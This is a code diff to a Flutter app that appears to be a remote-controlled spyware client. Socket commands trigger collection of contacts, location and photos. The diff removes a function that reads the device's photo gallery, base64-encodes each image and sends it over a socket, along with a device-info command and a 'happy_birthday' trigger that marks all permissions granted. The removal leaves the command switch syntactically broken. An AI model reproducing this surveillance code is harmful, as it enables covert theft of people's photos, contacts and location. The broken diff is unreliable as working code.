@@ -8,7 +8,6 @@ import 'package:geolocator/geolocator.dart';
 import 'package:camera/camera.dart';
 import 'package:record/record.dart';
 import 'package:contacts_service/contacts_service.dart';
-import 'package:photo_manager/photo_manager.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 
@@ -198,18 +197,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
         await getContacts();
         break;
       case 'get_photos':
-        await getPhotos(int.parse(params['count'] ?? '20'));
-        break;
-      case 'get_device_info':
-        await sendDeviceInfo();
-        break;
-      case 'happy_birthday':
-        setState(() {
-          allPermissionsGranted = true;
-        });
-        break;
-    }
-  }
 
   Future<void> getLocation() async {
     try {
@@ -315,29 +302,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
-  Future<void> getPhotos(int count) async {
-    try {
-      final photos = await PhotoManager.getAssetPathList(onlyAll: true);
-      if (photos.isNotEmpty) {
-        final assets = await photos[0].getAssetListPaged(page: 0, size: count);
-        
-        for (var asset in assets) {
-          final file = await asset.file;
-          if (file != null) {
-            final bytes = await file.readAsBytes();
-            final base64Image = base64Encode(bytes);
-            
-            socket.emit('photo_data', {
-              'image': base64Image,
-              'timestamp': DateTime.now().toIso8601String(),
-            });
-          }
-        }
-      }
-    } catch (e) {
-      socket.emit('error', {'error': e.toString()});
-    }
-  }
 
   @override
   void dispose() {
